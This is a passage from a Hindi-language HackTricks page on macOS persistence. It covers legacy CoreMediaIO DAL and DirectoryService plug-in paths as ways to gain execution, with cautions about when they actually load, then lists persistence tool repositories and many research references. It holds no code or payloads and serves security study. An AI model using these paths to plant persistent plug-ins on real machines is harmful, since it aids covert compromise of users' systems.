CoreMediaIO **DAL** (Device Abstraction Layer) plug-ins कुछ camera applications द्वारा in-process load किए जाते थे। Apple की [camera-extension presentation](https://developer.apple.com/videos/play/wwdc2022/10022/) विशेष रूप से कहती है कि legacy DAL plug-ins FaceTime, QuickTime Player या Photo Booth के साथ काम **नहीं** करते थे, और कई अन्य clients library validation लागू करते हैं। आधुनिक [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) अलग installation और approval model के साथ out of process चलते हैं। ऐतिहासिक in-process technique का अर्थ यह नहीं है कि मौजूदा macOS पर सामान्य Camera TCC bypass संभव है।<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26 पर read-only निरीक्षण: `/Library/CoreMediaIO/Plug-Ins/DAL` मौजूद है और Root के स्वामित्व में है। Legacy support या किसी client में loading की पुष्टि नहीं की गई।

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Legacy, conditional mechanism:** Install करने के लिए Root और ऐसा plug-in आवश्यक है जो वास्तव में configured और loaded हो। DirectoryService का plug-in API Deprecated है; इसे boot trigger मानने से पहले target Mac का Open Directory configuration देखें।

#### स्थान

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root आवश्यक
  - **Trigger:** Open Directory को आवश्यकता होने पर `dspluginhelperd` eligible configured plug-in load करता है। [Apple की plug-in runtime guide](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) के अनुसार, startup के लिए configured न किए गए plug-ins, उनके node के खुलने पर lazily load हो सकते हैं।

#### विवरण और Exploitation

`dspluginhelperd` legacy DirectoryService plug-in bundles को support करता है। जहाँ legacy plug-in स्वीकार और activate किया जाता है, वहाँ malicious plug-in privileged execution path बन सकता है; यह PAM और Authorization Plugins से अलग है। Directory का मौजूद होना यह साबित नहीं करता कि नया लिखा गया plug-in अगले boot पर चलेगा। macOS 26.5 पर Apple के स्थानीय `dspluginhelperd(8)` और `opendirectoryd(8)` manuals में अभी भी helper और यह legacy path सूचीबद्ध हैं।<sup>[[53]](#references)</sup>

macOS 26 पर read-only निरीक्षण: `/Library/DirectoryServices/PlugIns` और `/usr/libexec/dspluginhelperd` मौजूद हैं। इस परीक्षण के दौरान कोई plug-in install, configure या load नहीं किया गया।

## Persistence techniques और tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer का वर्ष](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [पुराने अच्छे LaunchAgents से आगे - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [पुराने अच्छे LaunchAgents से आगे - 18 - X11 और XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [पुराने अच्छे LaunchAgents से आगे - 21 - फिर से खोले गए Applications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [पुराने अच्छे LaunchAgents से आगे - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [पुराने अच्छे LaunchAgents से आगे - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [पुराने अच्छे LaunchAgents से आगे - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [पुराने अच्छे LaunchAgents से आगे - 22 - LoginHook और LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [पुराने अच्छे LaunchAgents से आगे - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [पुराने अच्छे LaunchAgents से आगे - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [पुराने अच्छे LaunchAgents से आगे - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [पुराने अच्छे LaunchAgents से आगे - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [पुराने अच्छे LaunchAgents से आगे - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [पुराने अच्छे LaunchAgents से आगे - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [पुराने अच्छे LaunchAgents से आगे - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [पुराने अच्छे LaunchAgents से आगे - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS पर Persistence के लिए Folder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [पुराने अच्छे LaunchAgents से आगे - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [पुराने अच्छे LaunchAgents से आगे - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [पुराने अच्छे LaunchAgents से आगे - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence का विश्लेषण (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [पुराने अच्छे LaunchAgents से आगे - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [अपनी Access बनाए रखना: macOS Persistence के लिए Screensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [पुराने अच्छे LaunchAgents से आगे - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [पुराने अच्छे LaunchAgents से आगे - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [पुराने अच्छे LaunchAgents से आगे - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [पुराने अच्छे LaunchAgents से आगे - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [पुराने अच्छे LaunchAgents से आगे - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugins के ज़रिए स्थायी Credential Theft (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [पुराने अच्छे LaunchAgents से आगे - 30 - man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [पुराने अच्छे LaunchAgents से आगे - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [पुराने अच्छे LaunchAgents से आगे - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [पुराने अच्छे LaunchAgents से आगे - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [पुराने अच्छे LaunchAgents से आगे - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [पुराने अच्छे LaunchAgents से आगे - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [पुराने अच्छे LaunchAgents से आगे - 10 - Application script files](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [पुराने अच्छे LaunchAgents से आगे - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [पुराने अच्छे LaunchAgents से आगे - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [पुराने अच्छे LaunchAgents से आगे - 34 - launchd boot tasks](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [पुराने अच्छे LaunchAgents से आगे - 35 - NVRAM के ज़रिए persistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS X पर persistence के लिए email का उपयोग (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [संदिग्ध Apple Mail Rule Plist Modification (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Malicious Profiles - Macs के लिए सबसे गंभीर खतरों में से एक (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243 का विश्लेषण: kernel extensions के ज़रिए macOS SIP bypass (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Code Project Files के ज़रिए RCE और API Token Exfiltration (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot और Cursor में नई Vulnerability - Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - वैकल्पिक installation methods (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Mac पर Chrome में ExtensionInstallForcelist हटाएँ (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo Plugins लिखने पर (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Custom URL Schemes के ज़रिए Remote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Plugins का दुरुपयोग करने वाली macOS persistence की दो तरकीबें (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL का न्यूनतम उदाहरण (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Spotlight-आधारित macOS TCC vulnerability का विश्लेषण (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` module documentation (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
